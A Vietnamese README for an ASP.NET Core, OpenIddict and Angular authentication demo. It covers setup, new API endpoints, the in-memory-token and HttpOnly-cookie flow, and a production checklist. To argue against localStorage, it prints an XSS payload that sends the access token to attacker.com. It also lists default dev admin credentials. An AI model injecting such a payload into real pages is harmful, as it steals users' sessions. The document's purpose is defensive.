# AuthDemo — ASP.NET Core 8 + OpenIddict 7.x + Angular 17

Hệ thống xác thực chuẩn bảo mật ATTT: không lưu token trong localStorage,
dùng In-Memory Access Token + HttpOnly Cookie cho Refresh Token.

---

## Mục lục

1. [Cấu trúc dự án](#1-cấu-trúc-dự-án)
2. [Hướng dẫn chạy lần đầu](#2-hướng-dẫn-chạy-lần-đầu)
3. [Luồng làm việc hằng ngày](#3-luồng-làm-việc-hằng-ngày)
4. [Phát triển REST API mới](#4-phát-triển-rest-api-mới)
5. [Luồng xác thực bảo mật](#5-luồng-xác-thực-bảo-mật)
6. [Checklist trước khi production](#6-checklist-trước-khi-production)

---

## 1. Cấu trúc dự án

```
OpenIdDict/
├── AuthDemo.Api/                        ← Backend .NET 8 + OpenIddict 7.x
│   ├── Controllers/
│   │   ├── AuthorizationController.cs   ← /connect/token, /connect/logout, /connect/userinfo
│   │   └── ApiController.cs             ← /api/api/me, /api/api/products, /api/api/admin-only
│   ├── Data/
│   │   └── ApplicationDbContext.cs      ← EF Core DbContext (Identity + OpenIddict tables)
│   ├── Models/
│   │   └── ApplicationUser.cs           ← Custom IdentityUser (thêm FullName)
│   ├── Services/
│   │   └── WorkerService.cs             ← Seed OpenIddict client + admin user khi startup
│   ├── Program.cs                       ← Đăng ký toàn bộ services, middleware pipeline
│   └── appsettings.json                 ← Connection string, logging config
│
└── auth-demo/                           ← Frontend Angular 17 (file này)
    └── src/app/
        ├── core/
        │   ├── auth/
        │   │   ├── token.service.ts     ← Lưu access token IN-MEMORY (không localStorage!)
        │   │   ├── auth.service.ts      ← Login / logout / refresh / initAuth
        │   │   ├── auth.interceptor.ts  ← Tự động đính Bearer token vào mọi HTTP request
        │   │   └── auth.guard.ts        ← Bảo vệ route: authGuard + roleGuard
        │   └── models/
        │       └── auth.model.ts        ← Interface TokenResponse, UserInfo
        ├── features/
        │   ├── auth/login/              ← Trang đăng nhập
        │   └── dashboard/              ← Trang sau khi đăng nhập
        ├── app.config.ts                ← Providers: router, httpClient, interceptor, APP_INITIALIZER
        └── app.routes.ts                ← Khai báo routes + guards
```

### Các bảng database được tạo

```
ASP.NET Core Identity:
  AspNetUsers              ← ApplicationUser (id, email, password hash, lockout...)
  AspNetRoles              ← Roles (Admin, User, Viewer)
  AspNetUserRoles          ← Mapping user ↔ role

OpenIddict:
  OpenIddictApplications   ← OAuth clients (angular-spa)
  OpenIddictTokens         ← Access token + Refresh token đang active (dùng để revoke)
  OpenIddictAuthorizations ← Authorization grants
  OpenIddictScopes         ← Scope definitions
```

---

## 2. Hướng dẫn chạy lần đầu

### Yêu cầu

- [.NET 8 SDK](https://dotnet.microsoft.com/download/dotnet/8)
- [Node.js 18+](https://nodejs.org/)
- SQL Server (LocalDB hoặc full) — hoặc đổi sang PostgreSQL (xem bên dưới)
- `dotnet-ef` tool

### Bước 1 — Cài EF Core tool (một lần duy nhất)

```bash
dotnet tool install --global dotnet-ef
```

### Bước 2 — Tạo và migrate database

```bash
cd AuthDemo.Api

# Tạo migration lần đầu (tạo code migration từ DbContext)
dotnet ef migrations add InitialCreate --output-dir Data/Migrations

# Áp dụng migration → tạo bảng trong SQL Server
dotnet ef database update
```

> **Dùng PostgreSQL thay SQL Server:**
>
> **Bước 1 — Cài package**
> ```bash
> dotnet add package Npgsql.EntityFrameworkCore.PostgreSQL
> ```
>
> **Bước 2 — Sửa `Program.cs`**
> ```csharp
> // Đổi:
> options.UseSqlServer(builder.Configuration.GetConnectionString("DefaultConnection"));
> // Thành:
> options.UseNpgsql(builder.Configuration.GetConnectionString("DefaultConnection"));
> ```
>
> **Bước 3 — Sửa connection string trong `appsettings.json`**
> ```json
> "DefaultConnection": "Host=localhost;Port=5432;Database=AuthDemoDB;Username=postgres;Password=yourpassword"
> ```
> ⚠️ Chú ý format Npgsql dùng **dấu chấm phẩy** để phân cách Host và Port (`Host=ip;Port=5432`),
> **không dùng dấu phẩy** như SQL Server (`Server=ip,1433`).
>
> **Bước 4 — Xóa migration cũ và tạo lại**
>
> Migration được tạo cho SQL Server chứa các kiểu dữ liệu không tương thích với PostgreSQL
> (`nvarchar`, `uniqueidentifier`, `bit`, `datetime2`). Phải xóa và tạo lại:
> ```bash
> # Xóa toàn bộ file trong thư mục Migrations/
> # (xóa thủ công hoặc dùng lệnh dưới nếu chưa apply lên DB)
> dotnet ef migrations remove --force
>
> # Tạo lại migration — Npgsql provider sẽ dùng đúng kiểu PostgreSQL
> # (character varying, uuid, boolean, integer, text...)
> dotnet ef migrations add InitialCreate
>
> # Apply lên database (hoặc để MigrateAsync() trong Program.cs tự làm khi startup)
> dotnet ef database update
> ```
>
> **Lưu ý về case sensitivity khi search**
>
> PostgreSQL phân biệt hoa/thường (case-sensitive) khi dùng `LIKE`, khác với SQL Server
> (thường là case-insensitive theo collation mặc định). Nếu có query tìm kiếm text, cần
> dùng `.ToLower()` trên cả hai vế hoặc `EF.Functions.ILike()` của Npgsql:
> ```csharp
> // Cách 1: portable (dùng được với mọi provider)
> var searchLower = search.ToLower();
> query = query.Where(u => u.UserName!.ToLower().Contains(searchLower));
>
> // Cách 2: Npgsql-specific (ngắn hơn, chỉ dùng khi biết chắc provider là PostgreSQL)
> query = query.Where(u => EF.Functions.ILike(u.UserName!, $"%{search}%"));
> ```

### Bước 3 — Chạy backend

```bash
cd AuthDemo.Api
dotnet run
```

Kết quả mong đợi:

```
Now listening on: https://localhost:7000
Now listening on: http://localhost:5000
Đã tạo OpenIddict Application: angular-spa
Đã tạo user admin mặc định: admin@demo.local — HÃY ĐỔI MẬT KHẨU!
```

Swagger UI: `http://localhost:5000/swagger`

### Bước 4 — Chạy frontend

```bash
cd auth-demo
npm install          # Lần đầu tiên
npm start            # Hoặc: npx ng serve
```

Mở browser: `http://localhost:4200`

**Tài khoản mặc định (chỉ để dev):**

| Field | Giá trị |
|-------|---------|
| Username / Email | `admin@demo.local` |
| Password | `Admin@123456` |
| Role | `Admin` |

### Kiểm tra nhanh bằng curl

```bash
# 1. Đăng nhập lấy token
curl -X POST http://localhost:5000/connect/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&username=admin@demo.local&password=Admin@123456&client_id=angular-spa&scope=openid profile email roles"

# 2. Gọi API được bảo vệ (thay <TOKEN> bằng access_token ở trên)
curl http://localhost:5000/api/api/me \
  -H "Authorization: Bearer <TOKEN>"

# 3. Endpoint công khai (không cần token)
curl http://localhost:5000/api/api/public
```

---

## 3. Luồng làm việc hằng ngày

### Khi thay đổi backend

```bash
cd AuthDemo.Api

# Sửa code → dotnet sẽ tự reload nếu dùng watch mode
dotnet watch run

# Khi thêm field mới vào model (ApplicationUser, entity mới...)
dotnet ef migrations add TenMigration --output-dir Data/Migrations
dotnet ef database update
```

### Khi thay đổi frontend

```bash
cd auth-demo

# Angular CLI tự reload khi lưu file
npm start

# Build production
npx ng build --configuration=production
```

### Khi thêm user / role mới trong dev

Sửa `WorkerService.cs` trong hàm `SeedDataAsync()` — mỗi lần restart server sẽ seed lại.
Trong production, dùng API endpoint riêng hoặc seed script chạy một lần.

---

## 4. Phát triển REST API mới

Đây là quy trình chuẩn để thêm một endpoint mới, ví dụ **quản lý danh sách nhân viên**.

### Bước 1 — Tạo Model (nếu cần bảng mới trong DB)

```csharp
// AuthDemo.Api/Models/Employee.cs
namespace AuthDemo.Api.Models;

public class Employee
{
    public int Id { get; set; }
    public string FullName { get; set; } = string.Empty;
    public string Department { get; set; } = string.Empty;
    public string CreatedById { get; set; } = string.Empty;  // FK → AspNetUsers
}
```

### Bước 2 — Đăng ký vào DbContext

```csharp
// AuthDemo.Api/Data/ApplicationDbContext.cs
public class ApplicationDbContext : IdentityDbContext<ApplicationUser>
{
    // Thêm dòng này
    public DbSet<Employee> Employees { get; set; } = null!;

    // ... phần còn lại giữ nguyên
}
```

### Bước 3 — Tạo migration và update DB

```bash
cd AuthDemo.Api
dotnet ef migrations add AddEmployeeTable --output-dir Data/Migrations
dotnet ef database update
```

### Bước 4 — Tạo Controller

```csharp
// AuthDemo.Api/Controllers/EmployeesController.cs
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Mvc;
using AuthDemo.Api.Data;
using AuthDemo.Api.Models;
using Microsoft.EntityFrameworkCore;
using OpenIddict.Abstractions;
using System.Security.Claims;

namespace AuthDemo.Api.Controllers;

[ApiController]
[Route("api/[controller]")]
[Authorize]                          // ← Mọi endpoint đều cần đăng nhập
public class EmployeesController : ControllerBase
{
    private readonly ApplicationDbContext _db;

    public EmployeesController(ApplicationDbContext db)
    {
        _db = db;
    }

    // GET /api/employees — Ai cũng xem được (chỉ cần đăng nhập)
    [HttpGet]
    public async Task<IActionResult> GetAll()
    {
        var employees = await _db.Employees.ToListAsync();
        return Ok(employees);
    }

    // GET /api/employees/5
    [HttpGet("{id}")]
    public async Task<IActionResult> GetById(int id)
    {
        var employee = await _db.Employees.FindAsync(id);
        return employee is null ? NotFound() : Ok(employee);
    }

    // POST /api/employees — Chỉ Admin mới tạo được
    [HttpPost]
    [Authorize(Roles = "Admin")]     // ← Ghi đè [Authorize] ở controller level
    public async Task<IActionResult> Create([FromBody] Employee employee)
    {
        // Lấy userId của người đang thực hiện từ JWT token
        var userId = User.FindFirstValue(OpenIddictConstants.Claims.Subject);
        employee.CreatedById = userId ?? string.Empty;

        _db.Employees.Add(employee);
        await _db.SaveChangesAsync();

        return CreatedAtAction(nameof(GetById), new { id = employee.Id }, employee);
    }

    // DELETE /api/employees/5 — Chỉ Admin
    [HttpDelete("{id}")]
    [Authorize(Roles = "Admin")]
    public async Task<IActionResult> Delete(int id)
    {
        var employee = await _db.Employees.FindAsync(id);
        if (employee is null) return NotFound();

        _db.Employees.Remove(employee);
        await _db.SaveChangesAsync();
        return NoContent();
    }
}
```

> **Không cần đăng ký thêm gì trong `Program.cs`** — `AddControllers()` đã tự scan tất cả controller trong assembly.

### Bước 5 — Gọi API từ Angular

```typescript
// Angular service gọi API mới — interceptor tự đính token, không cần làm gì thêm
import { HttpClient } from '@angular/common/http';
import { Injectable } from '@angular/core';
import { environment } from '../../../environments/environment';

@Injectable({ providedIn: 'root' })
export class EmployeeService {
  private readonly url = `${environment.apiUrl}/api/employees`;

  constructor(private http: HttpClient) {}

  getAll() {
    // Interceptor tự đính Authorization: Bearer <token> → không cần làm thủ công
    return this.http.get<Employee[]>(this.url);
  }

  create(employee: Partial<Employee>) {
    return this.http.post<Employee>(this.url, employee);
  }

  delete(id: number) {
    return this.http.delete(`${this.url}/${id}`);
  }
}

interface Employee {
  id: number;
  fullName: string;
  department: string;
}
```

### Bảo vệ route Angular cho trang mới

```typescript
// app.routes.ts — thêm route mới
{
  path: 'employees',
  loadComponent: () =>
    import('./features/employees/employees.component').then(m => m.EmployeesComponent),
  canActivate: [authGuard],               // Phải đăng nhập
},
{
  path: 'employees/manage',
  loadComponent: () =>
    import('./features/employees/manage.component').then(m => m.ManageComponent),
  canActivate: [authGuard, roleGuard('Admin')],  // Phải đăng nhập VÀ có role Admin
},
```

---

## 5. Luồng xác thực bảo mật

### Tại sao KHÔNG dùng localStorage

```
Kịch bản tấn công XSS khi dùng localStorage:
─────────────────────────────────────────────
1. Trang web bị lỗi XSS (thiếu sanitize input, dùng [innerHTML] không an toàn...)
2. Kẻ tấn công inject đoạn JS này vào trang:

   <img src="x" onerror="
     fetch('https://attacker.com/steal?t=' + localStorage.getItem('access_token'))
   ">

3. Script chạy trong browser của nạn nhân → token bị gửi về server hacker
4. Hacker dùng token gọi API như người dùng hợp lệ (15-60 phút)
5. Kết quả: HOÀN TOÀN bypass xác thực mà không cần mật khẩu
```

### Chiến lược trong dự án này

```
┌──────────────────────────────────────────────────────────────┐
│                   BROWSER (Angular)                          │
│                                                              │
│  TokenService {                                              │
│    private accessToken = null  ← Chỉ trong JS heap          │
│  }                                                           │
│                                                              │
│  localStorage  → TRỐNG (XSS kiểm tra → không có gì)        │
│  sessionStorage → TRỐNG                                      │
│  Cookies → refresh_token (HttpOnly, JS không đọc được)       │
└──────────────────────────────────────────────────────────────┘
          ↕ HTTPS (TLS 1.2+)
┌──────────────────────────────────────────────────────────────┐
│                 ASP.NET Core Backend                         │
│                                                              │
│  POST /connect/token                                         │
│    → Trả access_token trong body (Angular lưu vào memory)   │
│    → Set-Cookie: refresh_token=...; HttpOnly; Secure;        │
│                              SameSite=Strict; Path=/connect  │
│                                                              │
│  OpenIddictTokens table → Lưu token để có thể revoke        │
└──────────────────────────────────────────────────────────────┘
```

### Luồng đầy đủ từ đầu đến cuối

```
ĐĂNG NHẬP:
──────────
Angular          →  POST /connect/token {username, password, grant_type=password}
Backend          →  Verify password, check lockout
Backend          →  Tạo JWT access_token (15 phút) + refresh_token
Backend          →  Trả response {access_token, expires_in}
Backend          →  Set-Cookie: refresh_token=xxx; HttpOnly; Secure; SameSite=Strict
Angular          →  tokenService.setAccessToken(token, expiresIn)  ← lưu vào biến JS
Angular          →  GET /connect/userinfo  ← lấy thông tin user
Angular          →  Cập nhật authService._currentUser signal → UI re-render

GỌI API:
────────
Angular component  →  http.get('/api/employees')
authInterceptor    →  đọc tokenService.getAccessToken()
authInterceptor    →  clone request + thêm "Authorization: Bearer eyJ..."
Backend            →  OpenIddict validation middleware verify JWT signature
Backend            →  Populate HttpContext.User với claims từ token
Controller         →  [Authorize] check pass → xử lý request
Controller         →  User.FindFirstValue(Claims.Subject) → lấy userId

TOKEN HẾT HẠN (401):
─────────────────────
authInterceptor nhận 401
authInterceptor  →  POST /connect/token {grant_type=refresh_token, client_id}
                    (trình duyệt TỰ ĐÍNH KÈM HttpOnly cookie — Angular không biết giá trị)
Backend          →  Verify refresh_token từ cookie
Backend          →  Tạo access_token mới + refresh_token mới (rotation)
Backend          →  Set-Cookie: refresh_token=yyy; HttpOnly...  ← token cũ bị vô hiệu
authInterceptor  →  Lưu access_token mới vào memory
authInterceptor  →  Retry request gốc với token mới → thành công

SAU KHI F5 (trang reload):
──────────────────────────
APP_INITIALIZER  →  authService.initAuth()
initAuth()       →  POST /connect/token {grant_type=refresh_token}
                    (cookie vẫn còn → trình duyệt tự gửi)
Backend          →  Trả access_token mới
initAuth()       →  GET /connect/userinfo → lấy lại user info
Angular          →  isAuthenticated = true → render dashboard
                    (user không thấy màn hình login, mượt mà)

ĐĂNG XUẤT:
──────────
Angular   →  POST /connect/logout (có Bearer token)
Backend   →  Revoke token trong OpenIddictTokens table (token không dùng được nữa)
Backend   →  Set-Cookie: refresh_token=; Max-Age=0  ← xóa cookie
Angular   →  tokenService.clearAll() → xóa memory
Angular   →  Router.navigate('/auth/login')
```

### Security headers được cấu hình

| Header | Giá trị | Mục đích |
|--------|---------|---------|
| `X-Content-Type-Options` | `nosniff` | Chặn MIME type sniffing |
| `X-Frame-Options` | `DENY` | Chặn clickjacking (iframe) |
| `Content-Security-Policy` | `default-src 'self'` | Chặn load script từ domain lạ |
| `Strict-Transport-Security` | `max-age=31536000` | Bắt buộc HTTPS 1 năm (production) |
| `SameSite=Strict` trên cookie | — | Chặn CSRF — cookie không gửi từ domain khác |

### Lockout chống Brute Force

```
Cấu hình trong Program.cs:
  MaxFailedAccessAttempts = 5   ← Sai 5 lần → khóa tài khoản
  DefaultLockoutTimeSpan = 15 phút
  AllowedForNewUsers = true     ← User mới cũng bị lockout nếu sai nhiều lần

Flow:
  SignInManager.CheckPasswordSignInAsync(..., lockoutOnFailure: true)
    → Identity tự tăng FailedAccessCount khi sai password
    → Khi đủ 5 lần → set LockoutEnd = now + 15 phút
    → Mọi request trong thời gian lockout đều bị từ chối ngay (không check password)
    → Sau khi đăng nhập thành công → ResetAccessFailedCountAsync()
```

---

## 6. Checklist trước khi production

### Backend

- [ ] Đổi connection string sang production DB (environment variable, không hardcode)
- [ ] Thay `AddEphemeralEncryptionKey/SigningKey` bằng RSA certificate thật
- [ ] Xóa `EnableSensitiveDataLogging()` trong DbContext
- [ ] Xóa `.DisableTransportSecurityRequirement()` trong OpenIddict
- [ ] Đặt `SetAccessTokenLifetime(TimeSpan.FromMinutes(15))`
- [ ] Tắt Swagger trong production (`if (env.IsDevelopment())`)
- [ ] Đổi CORS `WithOrigins` sang domain production thật
- [ ] Đổi mật khẩu admin `Admin@123456`
- [ ] Cấu hình rate limiting cho `/connect/token` (tối đa 10 req/phút/IP)
- [ ] Set `RequireConfirmedEmail = true` nếu có email verification
- [ ] **Quan trọng:** Implement set HttpOnly cookie cho refresh_token trong controller

### Frontend

- [ ] Đảm bảo `environment.prod.ts` chỉ chứa `apiUrl`, không có secret
- [ ] `npx ng build --configuration=production` — không có source map
- [ ] Kiểm tra CSP header từ Nginx không chặn Angular app
- [ ] `withCredentials: true` trên mọi request cần cookie

### Hạ tầng

- [ ] Nginx với TLS 1.2+ và HSTS
- [ ] Chứng chỉ SSL từ CA hợp lệ (không self-signed)
- [ ] Reverse proxy ở phía trước Kestrel
- [ ] Firewall: chỉ mở port 443

---

*Dự án này implement theo chuẩn bảo mật ATTT Cấp 2 (Thông tư 12/2022/TT-BTTTT).
Nâng lên Cấp 3+: áp dụng BFF pattern — backend làm proxy, token không bao giờ ra browser.*
